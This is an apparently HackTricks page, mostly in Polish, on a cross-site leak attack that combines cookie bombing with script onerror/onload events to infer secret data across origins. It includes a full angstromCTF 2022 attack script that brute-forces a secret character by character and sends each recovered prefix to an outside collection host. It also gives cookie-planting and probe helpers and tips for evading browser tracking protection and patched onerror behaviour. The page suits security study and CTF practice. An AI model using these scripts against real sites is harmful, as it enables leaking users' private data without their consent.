# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Ta technika łączy:
- Cookie bombing: zapełnianie przeglądarki ofiary wieloma/dużymi cookies dla docelowego origin, tak aby kolejne żądania osiągały limity serwera/żądania (rozmiar nagłówków żądania, rozmiar URL w redirectach itp.).
- Error-event oracle: sondowanie cross-origin endpoint przy użyciu `<script>` (lub innego subresource) i rozróżnianie stanów za pomocą `onload` vs `onerror`.

Ogólna idea
- Znajdź docelowy endpoint, którego zachowanie różni się dla dwóch stanów, które chcesz przetestować (np. search “hit” vs “miss”).
- Upewnij się, że ścieżka „hit” wywoła długi łańcuch redirectów lub długi URL, podczas gdy ścieżka „miss” pozostanie krótka. Napompuj nagłówki żądania używając wielu cookies tak, aby tylko ścieżka „hit” spowodowała awarię serwera z HTTP error (np. 431/414/400). Błąd przełącza onerror i staje się oracle dla XS-Search.

Kiedy to działa
- Możesz sprawić, że przeglądarka ofiary wyśle cookies do celu (np. cookies są SameSite=None lub możesz ustawić je w kontekście first-party przez popup `window.open`).
- Jest funkcja aplikacji, którą możesz nadużyć, aby ustawić arbitralne cookies (np. „save preference” endpointy, które zamieniają kontrolowane nazwy/wartości wejściowe w Set-Cookie) lub aby wykonywać post-auth redirecty, które włączają dane kontrolowane przez atakującego do URL.
- Serwer reaguje inaczej w tych dwóch stanach i przy napompowanych nagłówkach/URL jeden ze stanów przekracza limit i zwraca odpowiedź błędu, która wywołuje onerror.

Uwaga dotycząca błędów serwera używanych jako oracle
- 431 Request Header Fields Too Large jest często zwracany, gdy cookies zwiększają rozmiar nagłówków żądania; 414 URI Too Long lub specyficzny dla serwera 400 może być zwrócony dla bardzo długich celów żądania. Każdy z nich skutkuje niepowodzeniem ładowania subresource i wywołaniem onerror. Zobacz [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) dla typowych przyczyn, takich jak nadmierna liczba cookies.

<details>
<summary>Praktyczny przykład (angstromCTF 2022)</summary>

Następujący skrypt (z publicznego writeupu) nadużywa funkcji, która pozwala atakującemu wstawić arbitralne cookies, a następnie ładuje cross-origin search endpoint jako script. Gdy zapytanie jest poprawne, serwer wykonuje redirect, który w połączeniu z nadmiarem cookies przekracza limity serwera i zwraca status błędu, więc script.onerror się uruchamia; w przeciwnym razie nic się nie dzieje.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Dlaczego popup (`window.open`)?
- Nowoczesne przeglądarki coraz częściej blokują third-party cookies. Otwarcie top-level window do celu sprawia, że cookies stają się first‑party, więc odpowiedzi Set-Cookie z celu zostaną zapisane, umożliwiając krok cookie-bomb nawet przy ograniczeniach third‑party cookies.

2024–2025 notatki o dostępności cookies
- Chrome’s Tracking Protection rollout (January 2024) już blokuje third-party cookies dla losowej kohorty i ma się rozszerzyć na całą bazę użytkowników po zatwierdzeniu przez UK CMA, więc zakładaj, że dowolna ofiara może nagle stracić 3P cookies. Zautomatyzuj fallback: wykrywaj, gdy twój script probe zawiedzie nie nawiązując w ogóle kontaktu z celem i przejrzyście przełączaj się na popup/first-party flow. Safari i Firefox już domyślnie blokują większość third‑party cookies, a CHIPS/partitioned cookies sprawiają, że każdej top-level site przypada własny jar.
- Użyj first‑party cookie planting flow (`window.open` + auto-submit do cookie-setting endpoint) a następnie probe przy pomocy subresource, który powiedzie się tylko gdy te cookies zostaną wysłane. Jeśli third‑party cookies są blokowane, przenieś probe do same-site kontekstu (np. uruchom oracle w popupie przez same-site gadget i exfiltrate boolean za pomocą `postMessage` lub beacon do twojego serwera), albo zarejestruj origin ofiary w Chrome’s deprecation trial jeśli nim legalnie zarządzasz.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

Jeśli musisz wstawić dziesiątki cookies z cross-site kontekstu, przygotuj tymczasowe top-level window i wyślij serię oversized form submissions do podatnego endpointu Set-Cookie:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Wywołaj to tuż przed rozpoczęciem probing, aby każdy przebieg oracle zaczynał się ze świeżo napełnionym cookie jar.

</details>

Ogólny pomocnik do probing
Jeśli masz już sposób na ustawienie wielu cookies na docelowym origin (first-party), możesz ponownie wykorzystać tego minimalnego oracle przeciwko dowolnemu endpointowi, którego sukces/niepowodzenie prowadzi do różnych wyników sieciowych (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternatywny tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Zaawansowane: de Bruijn–based cookie packing (CTF-proven)
- Gdy aplikacja pozwala ci kontrolować duże cookie values, możesz efektywnie upakować próby, dołączając sekwencję de Bruijn do każdej probe. To utrzymuje niewielki narzut na probe, a jednocześnie zapewnia, że heavy branch będzie konsekwentnie cięższy tylko dla właściwego prefiksu. Przykładowy generator dla |Σ| symboli długości n (zmieści się w cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Pomysł w praktyce: ustaw wiele cookie, których wartości to prefiks + deBruijn(k,n). Tylko gdy testowany prefiks jest poprawny serwer wybiera cięższą ścieżkę (np. dodatkowy redirect odzwierciedlający długie cookie lub URL), co w połączeniu z cookie bloat przekracza limity i przełącza onerror. Zobacz publiczny solver LA CTF 2024 używający tego podejścia.

Tips to build the oracle
- Force the “positive” state to be heavier: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path. Servers commonly cap header size and will fail sooner when many cookies are present.
- Stabilize: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Bust caches and avoid pooling artifacts: add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.
- Alternate subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA before assuming the boolean still fires.
- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## Referencje
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
